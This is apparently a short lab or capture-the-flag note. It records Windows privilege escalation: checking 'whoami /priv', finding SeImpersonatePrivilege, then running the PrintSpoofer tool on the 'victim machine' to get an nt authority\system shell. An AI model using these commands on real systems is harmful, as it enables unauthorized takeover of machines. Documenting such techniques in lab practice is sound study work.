Ran `whoami /priv`
![[Pasted image 20240907113722.png]]

SeImpersonatePrivilege is enabled for the user
- Downloaded PrintSpoofer64.exe into the victim machine
- Running PrintSpoofer
```powershell
.\PrintSpoofer.exe -i -c cmd.exe
```
![[Pasted image 20240907113817.png]]
Successfully got access as `nt authority\system`

